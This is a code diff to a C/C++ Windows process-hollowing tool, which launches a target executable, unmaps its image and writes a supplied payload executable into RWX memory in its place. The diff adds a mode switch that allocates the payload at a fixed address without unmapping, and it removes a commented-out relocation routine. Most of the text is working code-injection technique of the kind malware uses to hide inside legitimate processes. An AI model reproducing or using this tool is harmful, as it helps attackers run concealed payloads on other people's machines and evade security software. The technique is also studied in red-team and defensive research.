@@ -1,12 +1,21 @@
 #include "processHollowing.h"
 
+int mode = 0;
+
 int _tmain(int argc, _TCHAR* argv[])
 {
 	int returnCode = 0;
 	
 	if (argc > 2) {
 		fprintf(stderr, "*** Hello in Process Hollowing ! ***\n");
+		
+		if (argc == 4) {
+			mode = _ttoi(argv[3]);
+			fprintf(stderr, "mode = %d \n", mode);
+		}
+
 		returnCode = _CreateProcess(argv[1], argv[2]);
+
 	}
 	else {
 		fprintf(stderr, "**** Usage : [Tech]ProcessHollowing.exe <pathTarget.exe> <pathPayload.exe> ****\n");
@@ -133,20 +142,32 @@ int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
 	
 	//system("pause");
 
-	/* Unmap the target at PEB */
+	if (mode == 0) {
 
-	NtUnmapViewOfSection _ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
+		/* Unmap the target at PEB */
 
-	if (_ntUnmapViewOfSection(pPi->hProcess, peb.Reserved3[1]) != 0)
-		EXIT_WITH_ERROR("/!/ NtUnmapViewOfSection failed !");
+		NtUnmapViewOfSection _ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
 
-	fprintf(stderr, "	*** NtUnmapViewOfSection succeeded at 0x%x ***\n", peb.Reserved3[1]);
+		if (_ntUnmapViewOfSection(pPi->hProcess, peb.Reserved3[1]) != 0)
+			EXIT_WITH_ERROR("/!/ NtUnmapViewOfSection failed !");
 
-	/* STEP 4 : Allocate new memory and write each sections */ 
-	
-	pIBA = VirtualAllocEx(pPi->hProcess, peb.Reserved3[1], pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		fprintf(stderr, "	*** NtUnmapViewOfSection succeeded at 0x%x ***\n", peb.Reserved3[1]);
 
-	fprintf(stderr, "*** Step 4 : Write Payload,  New pIBA = 0x%x ***\n", pIBA);
+		/* STEP 4 : Allocate new memory and write each sections */
+
+		pIBA = VirtualAllocEx(pPi->hProcess, peb.Reserved3[1], pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		fprintf(stderr, "*** Step 4 : Write Payload,  New pIBA = 0x%x ***\n", pIBA);
+	}
+	else {
+
+		/* STEP 4 : Allocate new memory and write each sections */
+
+		pIBA = VirtualAllocEx(pPi->hProcess, (LPVOID) 0x85CD0000, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		fprintf(stderr, "*** Step 4 : Write Payload,  New pIBA = 0x%x ***\n", pIBA);
+
+	}
 
 	if (!pIBA)
 		EXIT_WITH_ERROR("/!/ Error allocate in pIBA !");
@@ -154,7 +175,6 @@ int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
 	DWORD64 deltaIBA = (DWORD64)pIBA - pNtH->OptionalHeader.ImageBase;
 	
 	//
-//	pNtH->OptionalHeader.ImageBase = (DWORD64)pIBA;
 
 	fprintf(stderr, "****[DEBUG] Source Image base : 0x%p \r \n, Destination Image Base : 0x%p \r \n Delta IBA : 0x%p \r \n",pNtH->OptionalHeader.ImageBase, pIBA, deltaIBA);
 
@@ -186,66 +206,6 @@ int UnMapAndInject(LPPROCESS_INFORMATION pPi, PVOID buffer, DWORD sizeBuffer)
 
 	system("pause");
 
-	/*
-	if (deltaIBA) {
-		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS));
-		fprintf(stderr, "*** Relocating the relocation table ... *** \n");
-		for (int i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
-
-			pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)buffer + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
-
-			BYTE* relocSecName = (BYTE*)".reloc";
-
-			if (memcmp(pSecH->Name, relocSecName, 5) != 0) {
-				continue; // if the section is not the ".reloc" Section continue to the next section
-			}
-		}
-
-		//Get the address of the section Data 
-		DWORD relocAddress = pSecH->PointerToRawData;
-		IMAGE_DATA_DIRECTORY relocTable = pNtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-		DWORD relocOffset = 0;
-
-		while (relocOffset < relocTable.Size) {
-			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((LPBYTE)buffer + relocAddress + relocOffset);
-			fprintf(stderr, "**[DEBUG] reloc block 0x%x. Size : 0x%x\n", relocBlock->pageAddress, relocBlock->blockSize);
-
-			relocOffset += sizeof(BASE_RELOCATION_BLOCK);
-	//			
-			DWORD relocEntryCount = (relocBlock->blockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY));
-	//			
-			fprintf(stderr, "relocEntryCount = %d , relocOffset : %d < relocTable.Size : %d\n", relocEntryCount,relocOffset, relocTable.Size);
-
-			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((LPBYTE)buffer + relocAddress + relocOffset);
-
-			for (int x = 0; x < relocEntryCount; x++) {
-
-				relocOffset += sizeof(BASE_RELOCATION_ENTRY);
-
-				if (relocEntries[x].type == 0)
-					continue;
-
-				DWORD patchAddr = relocBlock->pageAddress + relocEntries[x].offset;
-				DWORD64 entryAddress = 0;
-
-				if(!ReadProcessMemory(pPi->hProcess, (PVOID)((DWORD64)pIBA + patchAddr), &entryAddress, sizeof(PVOID), 0))
-					EXIT_WITH_ERROR("Error reloc ReadProcessMemory ");
-				
-				//fprintf(stderr, "*** [DEBUG] 0x%llx --> 0x%llx | At : 0x%llx \n", entryAddress, entryAddress + deltaIBA, (PVOID)((DWORD64)pIBA + patchAddr));
-
-				entryAddress += deltaIBA;
-
-				if (!WriteProcessMemory(pPi->hProcess, (PVOID)((DWORD64)pIBA + patchAddr), &entryAddress, sizeof(PVOID), 0))
-					EXIT_WITH_ERROR("Error reloc fin ");
-					
-			}
-		}
-
-		fprintf(stderr, "*** [DEBUG] reloc fin ! \n");
-
-	}
-	
-	*/
 	// Write the new Image Base Address
 
 	if (!WriteProcessMemory(pPi->hProcess, (LPVOID)(contextThread.Rdx + FIELD_OFFSET(PEB, Reserved3[1])), (LPVOID)&pIBA, sizeof(LPVOID), NULL))
